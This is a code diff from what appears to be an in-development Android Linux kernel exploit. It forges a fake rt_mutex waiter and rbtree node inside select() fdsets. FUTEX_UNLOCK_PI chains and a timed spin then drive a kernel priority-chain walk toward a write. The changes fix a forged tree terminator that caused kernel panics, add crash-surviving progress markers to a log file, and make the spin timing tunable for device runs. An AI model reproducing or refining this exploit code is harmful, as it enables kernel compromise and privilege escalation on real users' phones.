@@ -520,7 +520,16 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           {0, g_main_pc, "tree_pc"},
           {1, 0, "tree_right"},
           {2, g_main_left, "tree_left"},
-          {3, g_pi_parent, "pi_parent"},
+          /* REINSERT TERMINATION (09-21, final decode of the
+           * rb_insert_color+0x48 KP): after the erase delivers, the
+           * chain re-enqueues the ghost's pi node. rb_insert_color ENTRY
+           * reads node->pc: pc==0 → treated as tree ROOT → color black,
+           * return (clean). pc!=0 → walks parent chain; pc=1 (my first
+           * attempt) reads as RED parent=NULL → grandparent deref [0x8]
+           * → KP. pc=0 is the ONLY self-consistent terminator. The
+           * earlier pc=0 KP had a different cause: SPINSTAMP re-stamping
+           * DURING the walk (fixed by stop-on-calls). */
+          {3, 0, "pi_parent"},
           {4, 0, "pi_right"},
           {5, g_pi_left, "pi_left"},
           {6, ghost_task, "task"},
@@ -2491,6 +2500,19 @@ void do_pselect_fake_lock_route(void) {
       fd_set in2 = in, out2 = out, ex2 = ex;
       struct timeval tv0 = {0, 0};
       select(PSELECT_ROUTE_NFDS, &in2, &out2, &ex2, &tv0);
+      {
+        /* KP FORENSICS: stage.txt's last marker before the fire-#5 KP was
+         * pselect_pre_select — this pair brackets the mid-stamp select
+         * itself (the 0-timeout select that lays the ghost stamp). */
+        int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
+                       O_WRONLY | O_CREAT | O_APPEND, 0644);
+        if (sfd >= 0) {
+          const char *m = "midstamp_select_done\n";
+          (void)write(sfd, m, strlen(m));
+          fsync(sfd);
+          close(sfd);
+        }
+      }
       errno = 0;
       /*
        * PSELECT_LATE_UNLOCK=0 (jc9 follow-up): skip the unlock entirely.
@@ -2503,6 +2525,16 @@ void do_pselect_fake_lock_route(void) {
        */
       if (env_int_range("PSELECT_LATE_UNLOCK", 1, 0, 1)) {
         futex_op(f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+        {
+          int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
+                         O_WRONLY | O_CREAT | O_APPEND, 0644);
+          if (sfd >= 0) {
+            const char *m = "late_unlock_done\n";
+            (void)write(sfd, m, strlen(m));
+            fsync(sfd);
+            close(sfd);
+          }
+        }
         errno = 0;
         {
           int settle_ms = env_int_range("PSELECT_SETTLE_MS", 35, 0, 200);
@@ -2543,10 +2575,32 @@ void do_pselect_fake_lock_route(void) {
        * blocking select for the route-return bookkeeping (ret=2 path).
        */
       fd_set sin = in, sout = out, sex = ex;
-      struct timeval tv0 = {0, 0};
       struct timespec sp0, spn;
       clock_gettime(CLOCK_MONOTONIC, &sp0);
       int iters = 0;
+      /*
+       * KP FORENSICS (fire #5 post-mortem): the device KP lands somewhere
+       * in this window (stage.txt's last marker = pselect_pre_select) and
+       * QEMU survives it — so every marker here must be DURABLE (O_SYNC +
+       * fsync) to survive the panic. Phases: ms = post-stamp select,
+       * mu = post-unlock, sNN = spin iteration NN (every 16), se =
+       * spin exit (delivery seen / timeout). The suspected killer is the
+       * oplus syscall-hook layer × the spin's select storm — mitigated
+       * here: min 1ms per iteration (60 selects/150ms instead of ~250),
+       * and hard stop the moment the consumer reports success (post-
+       * delivery iterations are pure exposure).
+       */
+      int mark_every = env_int_range("SPIN_MARK_EVERY", 16, 0, 1000);
+      {
+        int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
+                       O_WRONLY | O_CREAT | O_APPEND, 0644);
+        if (sfd >= 0) {
+          const char *m = "spin_enter\n";
+          (void)write(sfd, m, strlen(m));
+          fsync(sfd);
+          close(sfd);
+        }
+      }
       for (;;) {
         /* select() is READ-MODIFY-WRITE: on return it copies the result
          * sets back into the user fdsets, wiping the stamp (the first
@@ -2554,22 +2608,59 @@ void do_pselect_fake_lock_route(void) {
          * adjust_prio_chain — because iterations 2+ copied zeros).
          * Rebuild the full ghost stamp before every select. */
         prepare_pselect_fdsets(&sin, &sout, &sex);
-        /* every 8th iteration blocks 3ms so the consumer's wchan guard
-         * (3x /proc/<tid>/{syscall,wchan} sampler) can confirm do_select —
-         * a pure tv=0 spin is in do_select for ~µs and is never sampled
-         * (jc spin test: 695 re-stamps, guard SKIPped, no punch). 3ms is
-         * far below the 60ms+ clobber window that killed the frozen
-         * single-stamp flow. */
-        struct timeval tvit = {0, (iters % 8 == 4) ? 3000 : 0};
+        /* every Nth iteration blocks SPIN_BLOCK_MS (default 1ms): the
+         * wchan guard needs the waiter inside do_select to sample it,
+         * while the block count sets the syscall-storm size. Cadence is
+         * env-tunable so the QEMU-validated pattern (3ms every 8th) is
+         * reproducible on device without a rebuild. */
+        int sb_n = env_int_range("SPIN_BLOCK_EVERY", 4, 1, 64);
+        int sb_ms = env_int_range("SPIN_BLOCK_MS", 1, 0, 10);
+        struct timeval tvit = {0, (iters % sb_n == (sb_n / 2)) ? sb_ms * 1000 : 0};
         select(PSELECT_ROUTE_NFDS, &sin, &sout, &sex, &tvit);
         iters++;
+        if (mark_every && (iters % mark_every) == 0) {
+          int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
+                         O_WRONLY | O_CREAT | O_APPEND, 0644);
+          if (sfd >= 0) {
+            char buf[32];
+            int n = snprintf(buf, sizeof(buf), "s%d\n", iters);
+            if (n > 0) (void)write(sfd, buf, (size_t)n);
+            fsync(sfd);
+            close(sfd);
+          }
+        }
+        if (atomic_load(&consumer_calls) > 0) {
+          /* STOP THE MOMENT THE PUNCH STARTS (calls, not success —
+           * success is post-setattr): the chain walk mutates the ghost's
+           * words (enqueue writes pc/parent into them). Any further
+           * re-stamp overwrites kernel-written linkage mid-walk — the
+           * next rb_insert_color then reads our stale pc=1 instead of
+           * the kernel's parent → NULL grandparent deref (the +0x5a8
+           * rb_insert_color KP). After the last stamp the waiter thread
+           * goes QUIESCENT in the blocking select (vDSO waits, no
+           * fdset copy) and the walk owns the words. */
+          break;
+        }
         clock_gettime(CLOCK_MONOTONIC, &spn);
         long el = (spn.tv_sec - sp0.tv_sec) * 1000000L +
                   (spn.tv_nsec - sp0.tv_nsec) / 1000;
         if (el >= 150000L)
           break;
       }
-      pr_info("JC2 SPINSTAMP: %d re-stamps over punch window\n", iters);
+      {
+        int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
+                       O_WRONLY | O_CREAT | O_APPEND, 0644);
+        if (sfd >= 0) {
+          char buf[48];
+          int n = snprintf(buf, sizeof(buf), "spin_exit iters=%d succ=%d\n",
+                           iters, (int)atomic_load(&consumer_success));
+          if (n > 0) (void)write(sfd, buf, (size_t)n);
+          fsync(sfd);
+          close(sfd);
+        }
+      }
+      pr_info("JC2 SPINSTAMP: %d re-stamps over punch window (succ=%d)\n",
+              iters, (int)atomic_load(&consumer_success));
       errno = 0;
     }
     int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
